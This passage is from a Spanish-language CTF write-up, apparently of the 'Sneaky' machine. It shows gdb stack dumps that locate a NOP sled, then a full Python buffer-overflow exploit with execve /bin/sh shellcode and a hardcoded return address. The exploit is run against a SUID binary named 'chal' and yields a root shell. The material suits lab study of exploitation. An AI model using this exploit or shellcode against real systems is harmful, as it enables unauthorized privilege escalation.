0xbffffad0:	0x00000020	0x00000005	0x00000009	0x00000007
0xbffffae0:	0xb7fde000	0x00000008	0x00000000	0x00000009
0xbffffaf0:	0x08048320	0x0000000b	0x000003e8	0x0000000c
0xbffffb00:	0x000003e8	0x0000000d	0x000003e8	0x0000000e
```
De momento no vemos los NOPs, vamos a avanzar:

```sh
(gdb) x/100wx $esp+200
0xbffffa48:	0xbffffdbf	0xbffffdd8	0xbffffde3	0xbffffdef
0xbffffa58:	0xbffffe4d	0xbffffe69	0xbffffe78	0xbffffe96
0xbffffa68:	0xbffffead	0xbffffebe	0xbffffed9	0xbffffee2
0xbffffa78:	0xbffffefa	0xbfffff02	0xbfffff17	0xbfffff5f
0xbffffa88:	0xbfffff7f	0xbfffff9e	0xbfffffb2	0xbfffffd4
0xbffffa98:	0x00000000	0x00000020	0xb7fdccf0	0x00000021
0xbffffaa8:	0xb7fdc000	0x00000010	0x078bfbff	0x00000006
0xbffffab8:	0x00001000	0x00000011	0x00000064	0x00000003
0xbffffac8:	0x08048034	0x00000004	0x00000020	0x00000005
0xbffffad8:	0x00000009	0x00000007	0xb7fde000	0x00000008
0xbffffae8:	0x00000000	0x00000009	0x08048320	0x0000000b
0xbffffaf8:	0x000003e8	0x0000000c	0x000003e8	0x0000000d
0xbffffb08:	0x000003e8	0x0000000e	0x000003e8	0x00000017
0xbffffb18:	0x00000001	0x00000019	0xbffffb4b	0x0000001f
0xbffffb28:	0xbfffffe8	0x0000000f	0xbffffb5b	0x00000000
0xbffffb38:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffb48:	0xb8000000	0xbe0ad27a	0xa3426d7b	0x6801a9ab
0xbffffb58:	0x694cc2bb	0x00363836	0x00000000	0x00000000
0xbffffb68:	0x752f0000	0x6c2f7273	0x6c61636f	0x6e69622f
0xbffffb78:	0x6168632f	0x9090006c	0x90909090	0x90909090
0xbffffb88:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb98:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffba8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbb8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbc8:	0x90909090	0x90909090	0x90909090	0x90909090
```
Aquí si que vemos nuestros NOPs. Después de los NOPs, cuando acaben, veríamos el shellcode:

```sh
(gdb) x/100wx $esp+500
0xbffffb74:	0x6e69622f	0x6168632f	0x9090006c	0x90909090
0xbffffb84:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb94:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffba4:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbb4:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbc4:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbd4:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbe4:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbf4:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc04:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc14:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc24:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc34:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc44:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc54:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc64:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc74:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc84:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc94:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffca4:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffcb4:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffcc4:	0x90909090	0x90909090	0x6850c031	0x68732f2f
0xbffffcd4:	0x69622f68	0x89e3896e	0xb0c289c1	0x3180cd0b
0xbffffce4:	0x80cd40c0	0x42424242	0x5f434c00	0x45504150
0xbffffcf4:	0x73653d52	0x2e53455f	0x2d465455	0x434c0038
(gdb) 
```

La idea es que nuestro EIP valga un punto intermediario (que no este muy cerca del shellcode digamos) donde esten los NOPs. Así que apuntará a esa dirección y gracias a los NOPs -que no hacen nada- se aplicará un desplazamiento hasta nuestro shellcode.  
Apuntaré varias direcciones porque alguna puede fallar:

```plaintext
# Se encuentran en el último bloque de código, cerca del shellcode pero no muy pegadas.
0xbffffc54
0xbffffca4
0xbffffc14
0xbffffc04
```

## Script Final

Pasemos una de estas direcciones a nuestro exploit y así quedaría nuestro exploit definitivo:

```py
#!/usr/bin/python3

# Esto es por el Little Endian; las direcciones de 32 bits que tienen que estar al revés
from struct import pack
import sys

# Siendo el offset el número de caracteres hasta sobreescribir EIP:
offset = 334  # 362 - 28
# En vez de las "A", que estan bien para ver más claro, colocaremos NOPs:
nops = b"\x90"*offset
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" # /bin/sh
eip = pack("<I", 0xbffffc54)

# Con el siguiente payload el EIP valdrá; 
payload = nops + shellcode + eip

# Ya por último, esto es como un print pero interpreta bytes digamos:
sys.stdout.buffer.write(payload)
```

**Inciso**  
El comando `sys.stdout.buffer.write(payload)` es más directo y se espera que escriba bytes directamente en la salida estándar sin ningún tipo de formato, print es más flexible y conveniente para imprimir mensajes formateados y datos en la consola.

Seguimos..

Para acabar, pasamos el script a la máquina objetivo (lo hacía en local con el nvim que es más bonito).

```sh
# Copiamos el script en máquina remota/objetivo
thrasivoulos@Sneaky:~$ cd /tmp
thrasivoulos@Sneaky:/tmp$ touch exploit.py
thrasivoulos@Sneaky:/tmp$ chmod +x exploit.py 
thrasivoulos@Sneaky:/tmp$ nano exploit.py

# Simplemente imprime, recuerda que hay muchos nops
thrasivoulos@Sneaky:/tmp$ python3 exploit.py 
1Ph//shh/bin°
             1@̀Tthrasivoulos@Sneaky:/tmp$ 
``` 

Estamos construyendo el argumento del programa **chal** que nos cargara una **/bin/sh** como root, aprovechando que tenemos el permiso SUID de ese programa como root. Así que pasamos como argumento:

```sh
thrasivoulos@Sneaky:/tmp$ chal $(python3 exploit.py)
# whoami
root
```

Espero que haya quedado claro. Agradecimiento a **s4vitar**, gracias a él me quedo claro a mi.






